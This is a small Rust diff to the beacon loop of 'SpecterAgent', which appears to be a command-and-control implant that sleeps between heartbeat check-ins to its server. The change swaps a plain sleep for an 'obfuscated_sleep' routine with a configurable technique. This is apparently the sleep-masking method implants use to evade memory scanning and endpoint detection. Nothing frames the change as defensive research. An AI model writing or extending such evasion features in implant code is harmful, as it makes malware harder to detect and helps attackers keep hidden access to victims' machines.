@@ -211,7 +211,7 @@ impl SpecterAgent {
             }
 
             let delay = self.compute_sleep_delay();
-            tokio::time::sleep(std::time::Duration::from_millis(delay)).await;
+            crate::sleep_obf::obfuscated_sleep(delay, self.config.sleep_technique).await;
 
             // Heartbeat — lets the server record liveness; response is normally NOJOB.
             if let Err(e) = self.checkin().await {
